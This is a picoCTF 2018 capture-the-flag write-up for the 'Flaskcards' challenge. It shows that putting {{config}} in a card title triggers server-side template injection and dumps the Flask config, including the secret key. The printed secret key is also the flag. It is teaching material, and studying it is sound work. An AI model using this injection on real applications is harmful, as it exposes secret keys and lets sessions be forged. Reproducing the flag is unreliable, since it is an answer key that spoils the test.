# Flaskcards
Web Exploitation - 350 points

## Challenge 
> We found this fishy website for flashcards that we think may be sending secrets. Could you take a look?

http://2018shell2.picoctf.com:17012/

## Hint
> Are there any common vulnerabilities with the backend of the website?

>Is there anywhere that filtering doesn't get applied?

>The database gets reverted every 2 hours so your session might end unexpectedly. Just make another user


## Solution

Similar to [AngstromCTF 2018 - MadLibs](https://github.com/zst123/angstromctf-2018-writeups/tree/master/Solved/MadLibs).

A vulnerability with unfiltered input.

Create a card with `{{config}}` as the title.


	Question:<Config {'TRAP_BAD_REQUEST_ERRORS': None, 'SESSION_COOKIE_HTTPONLY': True, 'DEBUG': False, 'JSONIFY_MIMETYPE': 'application/json', 'BOOTSTRAP_LOCAL_SUBDOMAIN': None, 'BOOTSTRAP_USE_MINIFIED': True, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'TEMPLATES_AUTO_RELOAD': None, 'SECRET_KEY': 'picoCTF{secret_keys_to_the_kingdom_2a7bf92c}', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'TESTING': False, 'MAX_COOKIE_SIZE': 4093, 'PROPAGATE_EXCEPTIONS': None, 'BOOTSTRAP_SERVE_LOCAL': False, 'JSON_AS_ASCII': True, 'SERVER_NAME': None, 'MAX_CONTENT_LENGTH': None, 'SQLALCHEMY_ECHO': False, 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_NAME': 'session', 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_COOKIE_PATH': None, 'APPLICATION_ROOT': '/', 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PREFERRED_URL_SCHEME': 'http', 'JSON_SORT_KEYS': True, 'SQLALCHEMY_NATIVE_UNICODE': None, 'EXPLAIN_TEMPLATE_LOADING': False, 'SQLALCHEMY_POOL_TIMEOUT': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SQLALCHEMY_BINDS': None, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'SESSION_COOKIE_SECURE': False, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'TRAP_HTTP_EXCEPTIONS': False, 'ENV': 'production', 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_RECORD_QUERIES': None, 'SESSION_REFRESH_EACH_REQUEST': True}>


## Flag

	picoCTF{secret_keys_to_the_kingdom_2a7bf92c}
